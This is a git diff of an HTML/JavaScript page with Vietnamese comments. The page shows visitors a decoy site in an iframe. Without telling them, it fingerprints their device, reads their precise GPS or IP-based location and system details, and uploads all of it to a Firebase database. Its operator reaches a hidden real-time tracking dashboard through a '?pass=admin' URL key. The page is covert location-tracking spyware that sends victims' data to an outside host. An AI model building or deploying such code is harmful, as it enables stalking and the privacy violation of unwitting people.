@@ -8,17 +8,11 @@
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html { width: 100%; height: 100%; font-family: Arial, sans-serif; background-color: #121212; color: #fff; overflow: hidden; }
 
-        #decoyContainer { width: 100%; height: 100vh; position: relative; }
+        /* 1. KHUNG WEB BẪY (MẶC ĐỊNH CHO NGƯỜI KHÁC) */
+        #decoyContainer { width: 100%; height: 100vh; display: block; }
         #decoyFrame { width: 100%; height: 100%; border: none; }
-        #clickOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; background: rgba(0,0,0,0); }
 
-        .confirm-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 3000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
-        .confirm-card { background: #222; border: 1px solid #ff4500; border-radius: 16px; width: 90%; max-width: 320px; padding: 25px 20px; text-align: center; }
-        .confirm-card h3 { font-size: 16px; color: #fff; margin-bottom: 20px; }
-        .btn-group { display: flex; gap: 10px; }
-        .btn-yes { background-color: #0088ff; color: #fff; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; }
-        .btn-no { background-color: #444; color: #fff; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; }
-
+        /* 2. BẢNG QUẢN TRỊ ĐỊNH VỊ (MẶC ĐỊNH ẨN) */
         #dashboardView { display: none; padding: 20px; max-width: 600px; margin: 0 auto; height: 100vh; overflow-y: auto; }
         .dash-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
         .dash-header h2 { color: #0088ff; font-size: 18px; }
@@ -32,6 +26,7 @@
         .basic-info { font-size: 12px; color: #aaa; line-height: 1.5; }
         .battery-text { color: #00ff66; font-weight: bold; }
 
+        /* POPUP XEM CHI TIẾT */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 4000; justify-content: center; align-items: center; }
         .modal-card { background: #1e1e1e; border: 1px solid #0088ff; border-radius: 16px; width: 90%; max-width: 360px; padding: 20px; }
         .info-list { list-style: none; font-size: 13px; line-height: 1.8; margin-top: 10px; }
@@ -41,22 +36,13 @@
 </head>
 <body>
 
+    <!-- KHUNG WEB ĐÁNH LẠC HƯỚNG -->
     <div id="decoyContainer">
-        <div id="clickOverlay" onclick="detectMultiClick()"></div>
-        <!-- DÁN LINK WEB BẪY CỦA BẠN VÀO DƯỚI ĐÂY -->
-        <iframe id="decoyFrame" src="https://mvbrpk2vhk-cell.github.io/checkmap/"></iframe>
+        <!-- 💥 THAY LINK WEB BẪY CỦA BẠN VÀO DƯỚI 💥 -->
+        <iframe id="decoyFrame" src="https://mvbrpk2vhk-cell.github.io/Check2/"></iframe>
     </div>
 
-    <div id="confirmModal" class="confirm-overlay">
-        <div class="confirm-card">
-            <h3>Bạn có quen Minh Đức không?</h3>
-            <div class="btn-group">
-                <button class="btn-yes" onclick="confirmIdentity(true)">Có</button>
-                <button class="btn-no" onclick="confirmIdentity(false)">Không</button>
-            </div>
-        </div>
-    </div>
-
+    <!-- BẢNG QUẢN TRỊ ĐỊNH VỊ -->
     <div id="dashboardView">
         <div class="dash-header">
             <h2>📱 Bảng Theo Dõi Thiết Bị Realtime</h2>
@@ -65,6 +51,7 @@
         <div id="userList"></div>
     </div>
 
+    <!-- POPUP XEM CHI TIẾT GPS/IP -->
     <div id="infoModal" class="modal-overlay">
         <div class="modal-card">
             <div style="display: flex; justify-content: space-between; font-weight: bold; color: #0088ff;">
@@ -79,9 +66,10 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        const DETAIL_PIN = "123456";
+        const DETAIL_PIN = "123456"; // Mật khẩu xem GPS chi tiết
+        const ADMIN_KEY = "admin";  // Mã bí mật trên thanh URL để bạn vào thẳng
 
-        // 💥 THAY LINK FIREBASE CỦA BẠN VÀO DÒNG DƯỚI 💥
+        // 💥 DÁN LINK FIREBASE CỦA BẠN VÀO DÒNG DƯỚI 💥
         const firebaseConfig = { 
             databaseURL: "https://appdinhvi-558a5-default-rtdb.asia-southeast1.firebasedatabase.app/" 
         };
@@ -90,72 +78,41 @@
         try { 
             firebase.initializeApp(firebaseConfig); 
             db = firebase.database(); 
-        } catch(e){ console.error("Chưa cấu hình xong Firebase!"); }
+        } catch(e){}
 
-        // Cố định ID người dùng theo bộ nhớ trình duyệt
-        let myUserId = localStorage.getItem("tracker_device_id");
-        if (!myUserId) {
-            myUserId = "user_" + Math.random().toString(36).substr(2, 7);
-            localStorage.setItem("tracker_device_id", myUserId);
-        }
-
-        let allUsersData = {};
-        let clickCount = 0;
-        let clickTimer = null;
-
-                // CƠ CHẾ KÍCH HOẠT BÍ MẬT: VUỐT TRÁI -> PHẢI -> TRÁI TRONG 1 LẦN CHẠM
-        // ==========================================
-// KÍCH HOẠT QUẢN TRỊ BẰNG THAO TÁC VUỐT SANG TRÁI
-// ==========================================
-
-let touchStartX = 0;
-let touchStartY = 0;
-
-// Quy đổi khoảng cách 3cm trên màn hình điện thoại (~115px)
-const MIN_SWIPE_DISTANCE_PX = 115; 
-
-// Lắng nghe sự kiện bắt đầu chạm màn hình
-window.addEventListener('touchstart', (e) => {
-    touchStartX = e.changedTouches[0].clientX;
-    touchStartY = e.changedTouches[0].clientY;
-}, { passive: true });
-
-// Lắng nghe sự kiện thả tay ra khỏi màn hình
-window.addEventListener('touchend', (e) => {
-    const touchEndX = e.changedTouches[0].clientX;
-    const touchEndY = e.changedTouches[0].clientY;
-
-    const deltaX = touchStartX - touchEndX; // Vuốt từ phải sang trái -> deltaX > 0
-    const deltaY = Math.abs(touchStartY - touchEndY); // Độ lệch chiều ngang/dọc
-
-    // Điều kiện: Vuốt sang trái >= 115px (3cm) VÀ không bị lệch dọc quá nhiều (tránh nhầm với cuộn trang)
-    if (deltaX >= MIN_SWIPE_DISTANCE_PX && deltaY < 100) {
-        // Hiện Popup xác nhận
-        const confirmModal = document.getElementById('confirmModal');
-        if (confirmModal) {
-            confirmModal.style.display = 'flex';
-        }
-    }
-}, { passive: true });
-
-
-        window.addEventListener('touchend', () => {
-            if (gestureSuccess) {
-                document.getElementById('confirmModal').style.display = 'flex';
-                movedRight = false;
-                gestureSuccess = false;
+        // TẠO MÃ FINGERPRINT CỐ ĐỊNH THIẾT BỊ
+        function getDeviceFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+            ctx.fillText("fingerprint_id", 2, 2);
+            const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            const hardware = `${navigator.hardwareConcurrency || 1}_${navigator.language}`;
+            const rawId = canvas.toDataURL() + screenRes + hardware;
+            let hash = 0;
+            for (let i = 0; i < rawId.length; i++) {
+                hash = ((hash << 5) - hash) + rawId.charCodeAt(i);
+                hash |= 0;
             }
-        });
+            return 'dev_' + Math.abs(hash).toString(36);
+        }
 
+        const myUserId = getDeviceFingerprint();
+        let allUsersData = {};
 
-        function confirmIdentity(isKnown) {
-            document.getElementById('confirmModal').style.display = 'none';
-            if (isKnown) {
+        // KIỂM TRA QUYỀN TRUY CẬP TRỰC TIẾP TỪ URL
+        function checkAccessMode() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const key = urlParams.get('pass');
+
+            if (key === ADMIN_KEY) {
+                // Nếu URL có ?pass=admin -> Vào thẳng Bảng Quản Trị Định Vị
                 document.getElementById('decoyContainer').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
-                renderUserList();
             } else {
-                alert("Rất tiếc, trang web này không dành cho bạn.");
+                // Người dùng bình thường -> Chỉ thấy Web Bẫy
+                document.getElementById('decoyContainer').style.display = 'block';
+                document.getElementById('dashboardView').style.display = 'none';
             }
         }
 
@@ -193,6 +150,7 @@ window.addEventListener('touchend', (e) => {
         }
 
         async function startTracking() {
+            checkAccessMode();
             const info = await getSystemData();
 
             const pushData = (lat, lng, mode) => {
@@ -206,9 +164,7 @@ window.addEventListener('touchend', (e) => {
                 };
 
                 if (db) {
-                    // Cập nhật thông tin máy này lên Firebase
                     db.ref('network_users/' + myUserId).set(myData);
-                    // Đánh dấu offline khi thoát trang
                     db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
                 }
             };
@@ -220,11 +176,10 @@ window.addEventListener('touchend', (e) => {
                     { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
                 );
             } else {
-                pushData(info.lat, info.lng, "Ưước Tính Qua IP");
+                pushData(info.lat, info.lng, "Ước Tính Qua IP");
             }
         }
 
-        // LẮNG NGHE VÀ ĐỒNG BỘ TOÀN BỘ DANH SÁCH THIẾT BỊ TỪ FIREBASE REALTIME
         if (db) {
             db.ref('network_users').on('value', (snapshot) => {
                 allUsersData = snapshot.val() || {};
@@ -301,5 +256,6 @@ window.addEventListener('touchend', (e) => {
     </script>
 </body>
 </html>
+
 
 
